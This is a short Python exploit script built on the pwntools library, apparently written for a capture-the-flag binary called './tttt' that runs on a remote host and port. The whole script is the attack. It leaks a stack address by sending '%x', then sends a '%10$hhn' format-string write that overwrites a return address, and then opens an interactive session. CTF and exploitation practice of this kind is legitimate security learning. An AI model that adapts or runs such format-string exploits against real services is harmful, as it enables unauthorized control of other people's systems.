from pwn import *

local=0
debug=1
atta=0
uselibc=0  #0 for no,1 for i386,2 for x64
haslibc=0
pc='./tttt'
remote_addr="210.28.132.84"
remote_port=20958

if uselibc==2 and haslibc==0:
    libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
    if uselibc==1 and haslibc==0:
        libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
    else:
        if haslibc!=0:
            libc=ELF('./libc.so.6')

if local==1:
    if haslibc:
        p = process(pc, env={'LD_PRELOAD': './libc.so.6'})
    else:
        p=process(pc)

else:
    p=remote(remote_addr,remote_port)
    if haslibc!=0:
        libc=ELF('./libc.so.6')

if debug:
    context.log_level=True

if atta:
    gdb.attach(p)
    #gdb.attach(p,open('debug'))

def hack():
    p.recvline()
    p.sendline("%x")
    stack_addr=int(p.recvline().strip('\n'),16)
    print("Stack address "+hex(stack_addr))
    raw_input()
    ret_address=stack_addr+0x40
    p.recvline()
    payload='%10$hhn'.ljust(12,'0')
    payload+=p32(ret_address)
    p.sendline(payload)
    p.interactive()

hack()
